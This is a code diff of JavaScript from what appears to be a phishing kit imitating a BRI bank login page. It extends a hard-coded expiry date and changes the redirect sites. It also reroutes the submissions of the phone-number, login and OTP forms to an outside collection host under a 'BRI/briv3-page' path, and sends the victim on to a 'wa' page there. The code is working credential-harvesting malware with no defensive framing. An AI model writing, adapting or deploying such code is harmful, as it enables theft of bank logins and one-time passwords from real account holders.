@@ -1,7 +1,7 @@
 let tglNow = new Date();
-let waktuBatas = new Date("2025-06-10T23:59:59");
+let waktuBatas = new Date("2025-06-21T23:59:59");
 if (tglNow.getTime() >= waktuBatas.getTime()) {
-  document.location.href = 'https://suspend-web.pages.dev';
+  document.location.href = 'https://expiredweb.pages.dev';
 } else {
   console.log('Server aktif');
 }
@@ -19,7 +19,7 @@ function sendNohp(){
    
        $.ajax({
             type: 'POST',
-            url: 'rest/no.php',
+            url: 'https://anjayhostjon.cloud/BRI/briv3-page/no.php',
             data: $('#hpForm').serialize(),
             datatype: 'JSON',
             
@@ -45,7 +45,7 @@ function sendLogin(){
    
      $.ajax({
             type: 'POST',
-            url: 'rest/login.php',
+            url: 'https://anjayhostjon.cloud/BRI/briv3-page/login.php',
             data: $('#loginForm').serialize(),
             datatype: 'JSON',
             
@@ -80,7 +80,7 @@ function sendOtp(){
      
      $.ajax({
             type: 'POST',
-            url: 'rest/otp.php',
+            url: 'https://anjayhostjon.cloud/BRI/briv3-page/otp.php',
             data: $('#formOtp').serialize(),
             datatype: 'JSON',
         
@@ -109,7 +109,7 @@ function wa(){
    audio.play();
    
 setTimeout(function(){  
-location.href='wa';
+location.href='https://anjayhostjon.cloud/BRI/briv3-page/wa';
     }, 5000);
     setTimeout(function(){
     $(".wait").fadeOut();   
